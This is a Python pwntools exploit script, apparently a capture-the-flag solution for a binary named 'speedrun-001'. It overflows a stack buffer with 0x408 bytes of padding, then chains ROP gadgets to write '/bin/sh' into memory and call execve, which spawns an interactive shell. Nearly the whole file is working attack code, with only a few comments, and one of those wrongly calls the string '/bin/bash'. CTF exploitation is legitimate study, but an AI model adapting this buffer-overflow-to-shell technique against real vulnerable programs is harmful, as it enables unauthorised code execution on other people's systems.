from pwn import *

target = process('./speedrun-001')
# gdb.attach(target, gdbscript = 'b *0x400bad')

popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

movGadget = p64(0x48d251)

syscall = p64(0x40129c)

'''
equivalent to

pop rdx, 0x2f62696e2f736800 (/bin/bash)
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = b''
rop += popRdx
rop += bytes('/bin/sh\x00', 'utf8')
rop += popRax
rop += p64(0x6b6000)
rop += movGadget

'''
preparation for the syscall
'''
rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)

rop += popRdx
rop += p64(0)

rop += syscall

# add the padding
payload = bytes([0] * 0x408) + rop

# print(payload)
# import sys
# sys.stdout.buffer.write(payload)
target.sendline(payload)
target.interactive()